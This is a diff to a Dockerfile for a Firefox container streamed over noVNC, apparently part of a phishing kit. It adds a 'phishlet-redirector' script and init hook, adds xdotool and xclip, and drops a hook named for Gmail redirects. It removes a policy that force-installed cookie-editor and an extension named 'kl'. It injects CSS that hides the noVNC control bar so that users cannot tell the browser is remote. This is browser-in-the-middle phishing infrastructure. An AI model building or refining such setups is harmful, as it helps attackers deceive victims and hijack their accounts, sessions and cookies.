@@ -1,8 +1,11 @@
 FROM jlesage/firefox
 
-RUN apk add --no-cache sqlite python3
+RUN apk add --no-cache sqlite python3 xdotool xclip
 
-RUN mkdir -p /usr/lib/firefox/distribution && \
-    printf '%s' '{"policies":{"ExtensionSettings":{"{c3c10168-4186-445c-9c5b-63f12b8e2c87}":{"installation_mode":"force_installed","install_url":"https://addons.mozilla.org/firefox/downloads/latest/cookie-editor/latest.xpi"},"fake@no-exist.org":{"installation_mode":"force_installed","install_url":"https://addons.mozilla.org/firefox/downloads/latest/kl/latest.xpi"}}}}' > /usr/lib/firefox/distribution/policies.json
+COPY extensions/phishlet-redirector/phishlet-redirector.py /opt/phishlet-redirector.py
+COPY extensions/phishlet-redirector/99-phishlet-redirector /etc/cont-init.d/99-phishlet-redirector
+RUN chmod +x /etc/cont-init.d/99-phishlet-redirector
+
+RUN rm -f /etc/cont-init.d/99-gmail-redirect
 
 RUN sed -i 's|</head>|<style>#noVNC_control_bar,#noVNC_control_bar_handle{display:none!important}</style></head>|' /opt/noVNC/index.html
